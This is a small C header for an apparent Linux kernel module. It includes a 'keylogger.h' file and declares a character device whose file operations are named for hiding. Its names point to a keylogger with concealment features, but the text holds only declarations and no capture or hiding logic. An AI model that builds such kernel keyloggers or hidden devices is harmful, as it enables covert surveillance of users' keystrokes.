#ifndef _MODULE_H_
#define _MODULE_H_
#include "keylogger.h"
dev_t dev_num1;
struct cdev *mcdev1;
static struct file_operations fops_hide =
{
    .owner = THIS_MODULE,
    .open = dev_open_fops_for_hide
};

#endif